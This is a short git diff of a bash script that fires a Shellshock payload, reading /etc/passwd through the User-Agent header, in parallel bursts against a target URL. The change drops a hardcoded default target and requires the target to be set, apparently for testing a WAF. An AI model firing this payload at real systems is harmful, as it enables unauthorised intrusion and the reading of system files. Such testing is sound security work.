@@ -1,5 +1,5 @@
 #!/bin/bash
-TARGET="${TARGET:-https://aitrading.ninja}"
+TARGET="${TARGET:?Set TARGET env var, e.g. TARGET=https://your-waf-protected-host.example}"
 COUNT="${COUNT:-100}"
 echo "Firing ${COUNT}x each pattern against ${TARGET}"
 for i in $(seq 1 $COUNT); do curl -s -o /dev/null -A "() { :;}; /bin/cat /etc/passwd" "$TARGET/?shellshock=$i" & done
